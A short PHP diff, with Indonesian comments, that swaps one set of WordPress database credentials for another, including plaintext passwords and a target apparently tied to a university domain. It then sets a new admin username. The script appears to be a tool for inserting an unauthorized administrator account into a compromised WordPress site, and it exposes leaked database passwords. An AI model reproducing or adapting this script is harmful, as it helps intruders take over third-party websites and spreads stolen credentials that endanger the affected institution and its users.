@@ -5,10 +5,10 @@ ini_set('display_errors', 1);
 
 // Konfigurasi database
 $db_host = 'localhost';
-$db_name = 'laborato40_wp826';
-$db_user = 'laborato40_wp826';
-$db_pass = '7(WW7S9@p7';
-$table_prefix = 'wpwu_';
+$db_name = 'unitru.edu.pe';
+$db_user = 'unitru.edu.pe';
+$db_pass = 'y![2P7ec13cVoRcd';
+$table_prefix = 'wpo_';
 
 // Data admin baru
 $new_username = 'madz';
